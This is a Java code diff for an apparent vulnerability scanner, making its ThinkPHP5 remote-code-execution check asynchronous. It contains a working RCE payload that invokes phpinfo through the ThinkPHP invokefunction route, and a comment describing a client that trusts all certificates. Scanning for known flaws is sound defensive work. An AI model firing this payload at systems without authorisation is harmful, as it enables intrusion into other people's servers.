@@ -4,6 +4,7 @@ import okhttp3.*;
 import org.jetbrains.annotations.NotNull;
 
 import java.io.IOException;
+import java.lang.reflect.Method;
 import java.util.ArrayList;
 import java.util.HashMap;
 
@@ -13,12 +14,17 @@ import java.util.HashMap;
 public class UniversalScan
 {
     /**
-     * 针对单个目标验证是否存在ThinkPHP5远程代码执行漏洞。
+     * 采用异步方式针对单个目标验证是否存在ThinkPHP5远程代码执行漏洞，将结果以键值对方式存入传入成员变量HashMap中。
      * @param okHttpClient
      * @param targetUrl
      * @return
      */
-    public Boolean thinkPHP_RCE(OkHttpClient okHttpClient,String targetUrl)
+    public void thinkPHP_RCE(
+            OkHttpClient okHttpClient,
+            String targetUrl,
+            HashMap<String,Boolean> resultHashMap,
+            Method method
+    )
     {
         String payload="/index.php?s=index%2f\\think\\app%2finvokefunction&function=phpinfo&vars[0]=100";
         String finger="arg_separator.output";
@@ -27,29 +33,33 @@ public class UniversalScan
                 .url(fullUrl)
                 .header("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36")
                 .build();
-        try
+
+        //传入的OkHttpClient是信任所有证书的，并且设置好连接超时、读写超时
+        okHttpClient.newCall(request).enqueue(new Callback()
         {
-            //传入的OkHttpClient是信任所有证书的，并且设置好连接超时、读写超时
-            Response response=okHttpClient.newCall(request).execute();
-            if(!response.isSuccessful())
+            @Override
+            public void onFailure(@NotNull Call call, @NotNull IOException e)
             {
-                throw new IOException("Unexpected code"+response);
+                System.out.println(targetUrl+"测试"+method.getName()+"漏洞时，连接异常！");
             }
-            //根据指纹判断是否有phpinfo页面，来确定是否有漏洞
-            if (response.body().string().indexOf(finger)!=-1)
+
+            @Override
+            public void onResponse(@NotNull Call call, @NotNull Response response) throws IOException
             {
-                return true;
+                //根据指纹判断是否有phpinfo页面，来确定是否有漏洞
+                if (response.body().string().indexOf(finger)!=-1)
+                {
+                    resultHashMap.replace(method.getName(),true);
+                    System.out.println(targetUrl+"存在"+method.getName()+"漏洞");
+                }
+                else
+                {
+                    System.out.println(targetUrl+"不存在"+method.getName()+"漏洞");
+                }
             }
-            else
-            {
-                return false;
-            }
-        }
-        catch (IOException e)
-        {
-            e.printStackTrace();
-            return false;
-        }
+        });
+
+
     }
 
     /**
@@ -104,8 +114,18 @@ public class UniversalScan
      * @param okHttpClient
      * @param str
      */
-    public void testPrint(OkHttpClient okHttpClient,String str)
+    public void testPrint(OkHttpClient okHttpClient,String str,HashMap<String,Boolean> resultHashMap,
+                          Method method)
     {
+        try
+        {
+            Thread.currentThread().sleep(2000);
+        }
+        catch (InterruptedException e)
+        {
+            e.printStackTrace();
+        }
+        resultHashMap.replace(method.getName(),true);  //测试能否加载多个插件，并且将正确的值赋值给成员
         System.out.println("测试反射调用方法打印成功！"+str);
     }
 }
